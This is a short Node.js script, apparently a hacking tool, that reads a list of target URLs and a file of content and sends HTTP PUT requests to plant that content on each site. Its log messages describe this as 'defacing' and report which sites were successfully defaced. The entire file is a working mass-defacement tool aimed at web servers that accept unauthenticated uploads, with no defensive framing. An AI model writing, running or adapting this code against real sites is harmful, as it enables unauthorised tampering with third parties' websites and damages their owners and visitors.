//Dependencies
const Request = require("request")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Main
if(!Self_Args.length){
    console.log("node index.js <urls> <to_put>")
    process.exit()
}

if(!Self_Args[0]){
    console.log("Invalid urls.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid to_put.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[0])){
    console.log("Invalid urls.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[1])){
    console.log("Invalid to_put.")
    process.exit()
}

const urls_data = Fs.readFileSync(Self_Args[0], "utf8").split("\n")
const to_put_data = Fs.readFileSync(Self_Args[1], "utf8")

if(!urls_data){
    console.log("Urls data is empty.")
    process.exit()
}

if(!to_put_data){
    console.log("To put data is empty.")
    process.exit()
}

var url_index = 0

console.log("Defacing has started.")
Deface()
function Deface(){
    if(url_index == urls_data.length){
        console.log("Finished defacing.")
        process.exit()
    }

    Request.put(`${urls_data[url_index]}/${Self_Args[1]}`, {
        timeout: 10000,
        body: to_put_data
    }, function(err, res, body){
        if(err){
            console.log(`Failed to deface ${urls_data[url_index]}`)

            url_index += 1
            Deface()
            return
        }

        if(res.statusCode == 200){
            console.log(`Successfully defaced ${urls_data[url_index]} in ${urls_data[url_index]}/${Self_Args[1]}`)
        }else{
            console.log(`Failed to deface ${urls_data[url_index]}`)
        }

        url_index += 1
        Deface()
    })
}
